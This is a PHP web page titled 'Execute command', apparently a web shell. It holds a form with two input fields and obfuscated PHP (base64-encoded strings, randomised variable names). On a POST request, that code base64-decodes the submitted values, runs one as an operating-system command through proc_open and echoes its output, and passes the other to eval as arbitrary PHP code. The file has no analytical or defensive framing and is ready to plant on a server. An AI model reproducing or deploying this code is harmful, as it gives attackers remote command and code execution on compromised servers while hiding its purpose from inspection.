<!DOCTYPE html>
<html>
<head>
	<title>Execute command</title>
</head>
<body>
	<form method="post" action="">
		<label for="command">Enter command:</label>
		<input type="text" name="command" id="command">
		<input type="text" name="php" id="php">
		<input type="submit" value="Execute">
	</form>

<?php if($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')]===base64_decode('UE9TVA==')){$c1dccadfed7bc=$_POST[base64_decode('Y29tbWFuZA==')];$ye1bfd762321e=$_POST[base64_decode('cGhw')];$c1dccadfed7bc=strtr($c1dccadfed7bc,base64_decode('LQ=='),base64_decode('PQ=='));$c1dccadfed7bc=base64_decode($c1dccadfed7bc);$ye1bfd762321e=strtr($ye1bfd762321e,base64_decode('LQ=='),base64_decode('PQ=='));$ye1bfd762321e=base64_decode($ye1bfd762321e);if($c1dccadfed7bc){$k1ebe3f3e4e46=array(0=>array(base64_decode('cGlwZQ=='),base64_decode('cg==')),1=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')),2=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')));$w5075140835d0=proc_open($c1dccadfed7bc,$k1ebe3f3e4e46,$s24a9384d408f);if(is_resource($w5075140835d0)){$u78e6221f6393='';while(($tc68271a63ddb=fgets($s24a9384d408f[1]))!==false){$u78e6221f6393.=$tc68271a63ddb;}while(($q56bd7107802e=fgets($s24a9384d408f[2]))!==false){$u78e6221f6393.=$q56bd7107802e;}fclose($s24a9384d408f[0]);fclose($s24a9384d408f[1]);fclose($s24a9384d408f[2]);proc_close($w5075140835d0);echo base64_decode('PHByZT4=');echo $u78e6221f6393;echo base64_decode('PC9wcmU+');}else{echo base64_decode('RXJyb3IgZXhlY3V0aW5nIGNvbW1hbmQ=');}}if($ye1bfd762321e){$eb4a88417b3d0=eval($ye1bfd762321e);echo $eb4a88417b3d0;}}?>
</body>
</html>